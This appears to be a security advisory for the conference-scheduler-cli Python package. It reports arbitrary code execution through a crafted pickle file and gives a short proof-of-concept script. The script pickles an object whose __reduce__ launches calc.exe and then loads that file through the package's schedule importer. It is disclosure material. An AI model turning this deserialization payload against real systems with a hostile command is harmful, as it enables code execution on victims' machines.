# Overview

`conference-scheduler-cli` is a command line tool to manage the schedule for a conference.

This package is vulnerable to Arbitrary Code Execution via a crafted `.pickle` file.

# Proof of Concept

```
from scheduler import io
import os
from pathlib import Path
import pickle
class joel_test(object):
    def __reduce__(self):
        import subprocess
        return (subprocess.Popen, ('calc.exe',))
test = joel_test()
f=open('solution\\scheduler.pickle','wb')
pickle.dump(test,f)
f.close()
io.import_schedule_definition(Path(Path.cwd(), 'solution'))
```
